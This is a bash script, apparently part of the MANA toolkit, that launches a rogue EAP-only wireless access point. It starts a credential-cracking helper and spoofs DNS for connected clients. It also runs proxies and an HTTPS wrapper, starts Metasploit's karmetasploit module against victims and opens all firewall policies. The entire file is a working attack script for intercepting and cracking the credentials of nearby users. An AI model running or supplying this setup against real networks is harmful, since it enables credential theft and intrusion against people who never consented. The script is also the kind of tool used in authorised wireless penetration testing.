#!/bin/bash

phy=wlan0
conf=/etc/mana-toolkit/hostapd-mana-eaponly.conf
hostapd=/usr/lib/mana-toolkit/hostapd
crackapd=/usr/share/mana-toolkit/crackapd/crackapd.py

hostname WRT54G
echo hostname WRT54G
sleep 2

# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
echo $EXNODE
mkfifo $EXNODE
$crackapd&

service network-manager stop
rfkill unblock wlan

# Start hostapd
sed -i "s/^interface=.*$/interface=$phy/" $conf
sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
$hostapd $conf&
sleep 5
ifconfig $phy
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
service apache2 start
stunnel4 /etc/mana-toolkit/stunnel.conf
tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
msfconsole -r /etc/mana-toolkit/karmetasploit.rc&

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F

echo "Hit enter to kill me"
read
pkill hostapd
rm /tmp/crackapd.run
rm $EXNODE
pkill dnsmasq
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
pkill msfconsole
pkill python
pkill ruby
service apache2 stop
iptables -t nat -F
